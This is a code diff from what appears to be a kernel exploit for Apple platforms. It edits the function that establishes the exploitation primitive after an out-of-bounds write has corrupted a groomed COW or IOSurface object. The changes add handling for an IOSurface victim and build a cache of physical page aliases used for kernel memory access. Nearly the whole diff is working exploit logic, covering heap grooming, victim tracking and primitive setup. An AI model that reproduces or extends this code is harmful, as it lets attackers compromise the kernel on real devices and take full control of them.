@@ -101,20 +101,33 @@ prim_t g_prim;
 
 bool prim_establish(void)
 {
-    /* The victim is the groom object whose page array the OOB overwrote.
-     * wire.c records its index when verify_wire_landed() sees it. */
+    /* The victim is the object (COW groom or IOSurface) whose page array
+     * the OOB overwrote. wire.c records it when verify_wire_landed() sees
+     * the write-through alias. */
     int idx = wire_victim_index();
-    if (idx < 0) {
-        LOGBAD("prim_establish: no corrupted groom object recorded");
+    int sidx = wire_victim_surf();
+    bool surf_victim = (sidx >= 0);
+    if (idx < 0 && !surf_victim) {
+        LOGBAD("prim_establish: no corrupted groom/surf object recorded");
         return false;
     }
     U64 base = 0, size = 0;
-    if (!wire_groom_info((U64)idx, &base, &size)) {
-        LOGBAD("prim_establish: groom[%d] unavailable", idx);
-        return false;
+    if (surf_victim) {
+        if (!wire_surf_info((U64)sidx, &base, &size)) {
+            LOGBAD("prim_establish: surf[%d] unavailable", sidx);
+            return false;
+        }
+        LOGOK("prim: victim surf[%d] base=%#llx size=%#llx "
+              "(phys-window object in OOB path - kernel phys steering is speculative)",
+              sidx, base, size);
+    } else {
+        if (!wire_groom_info((U64)idx, &base, &size)) {
+            LOGBAD("prim_establish: groom[%d] unavailable", idx);
+            return false;
+        }
+        LOGOK("prim: victim groom[%d] base=%#llx size=%#llx", idx, base, size);
     }
     g_prim.active = true;
-    LOGOK("prim: victim groom[%d] base=%#llx size=%#llx", idx, base, size);
 
     /* Build the phys alias cache: the corrupted victim range, the
      * victim groom's pages, every COW groom, every IOSurface groom. */
@@ -140,6 +153,12 @@ bool prim_establish(void)
         }
     }
     LOGOK("prim: %llu owned pages resolvable in phys alias cache", g_phys_win_n);
+    if (g_phys_win_n == 0) {
+        LOGBAD("prim: phys alias cache is empty - mach_vm_page_info is not "
+               "reporting physical_page on this target");
+        g_prim.active = false;
+        return false;
+    }
     return true;
 }
 
